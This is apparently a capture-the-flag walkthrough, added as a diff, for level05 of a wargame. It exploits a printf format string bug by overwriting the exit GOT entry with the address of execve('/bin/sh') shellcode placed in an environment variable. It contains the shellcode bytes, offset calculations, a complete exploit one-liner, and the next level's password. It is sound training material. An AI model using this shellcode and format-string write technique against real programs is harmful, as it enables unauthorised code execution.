@@ -1,0 +1,61 @@
+on level 05 we have a printf format string vulnerability
+
+there is no call to system or exec in the program 
+
+what we will have to do is to overwrite the jump address of exit with the address of a shellcode loaded in the env
+
+
+export SC=$(python -c 'print("\x90"*200+"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
+
+and get the address of the shellcode
+
+(gdb)x/1000s environ
+...
+0xffffde42:	 "SC=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
+0xffffdf0a:	 "\220\220\220j\vX\231Rh//shh/bin\211\343\061\311̀"
+...
+
+
+now we need to find the offset in the stack of our input 
+
+level05@OverRide:~$ python -c 'print("%x "*100)' | ./level05
+64 f7fcfac0 f7ec3af9 ffffd5ff ffffd5fe 0 ffffffff ffffd684 f7fdb000 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520
+
+
+our offset is the 10th position 
+and since the address of our shellcode is too large to print in a single time we will have to split it and write it in 2 part
+
+
+0xffffde50
+
+0xffff = 65535
+0xde50 = 56912
+
+65535 - 56912 = 8623
+
+56912 - 8 = 56904
+
+
+so we will write 56904 in the first position and 8623 at the second 
+
+now we need to find the adrress of exit jump
+
+$ objdump -d level05 | grep -1 exit
+
+08048370 <exit@plt>:
+ 8048370:	ff 25 e0 97 04 08    	jmp    *0x80497e0
+--
+ 804850c:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
+ 8048513:	e8 58 fe ff ff       	call   8048370 <exit@plt>
+ 8048518:	90                   	nop
+
+
+ok so we will overwrite the address 0x80497e0 with 56904 at offset 10
+and 0x80497e2 with 8623 at offset 11
+
+level05@OverRide:~$ (python -c 'print("\x08\x04\x97\xe0"[::-1]+"\x08\x04\x97\xe2"[::-1]+"%56904d%10$hn"+"%8623d%11$hn")'; cat) | ./level05 | tr -d " "
+cd ../level06
+ls
+�100level06
+cat .pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
